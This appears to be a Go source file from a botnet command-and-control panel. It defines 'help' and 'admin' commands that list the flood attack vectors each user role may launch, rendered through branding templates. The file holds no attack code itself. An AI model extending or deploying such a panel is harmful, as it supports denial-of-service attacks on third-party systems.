package commands

import (
	"cnc/internal/master/command"
	"cnc/internal/master/floods"
	"cnc/internal/master/sessions"
	"sort"
)

func init() {
	command.Create(&command.Command{
		Aliases:     []string{"help", "?"},
		Description: "Lists all available commands.",
		Arguments:   []*command.Argument{},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			type vec struct {
				Name string
				*floods.Vector
			}

			// make a list
			vectorList := make([]*vec, 0, len(floods.VectorList))

			//  put it all in a list
			for n, vector := range floods.VectorList {
				if vector.API {
					continue
				}

				if session.ContainsRole(vector.Roles) || session.HasRole("admin") {
					vectorList = append(vectorList, &vec{n, vector})
				}
			}

			// sort it by ID
			sort.Slice(vectorList, func(i, j int) bool {
				return vectorList[i].ID < vectorList[j].ID
			})

			_ = session.ExecuteBranding(nil, "commands/help_top.tfx")

			for _, vector := range vectorList {
				_ = session.ExecuteBranding(map[string]any{
					"name": vector.Name,
					"desc": vector.Description,
				}, "commands/help_center.tfx")
			}

			_ = session.ExecuteBranding(nil, "commands/help_bottom.tfx")

			return nil
		},
	})

	command.Create(&command.Command{
		Aliases:     []string{"admin"},
		Description: "Lists all available admin commands.",
		Arguments:   []*command.Argument{},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			return session.ExecuteBranding(nil, "admin_help.tfx")
		},
	})
}

func Init() {

}
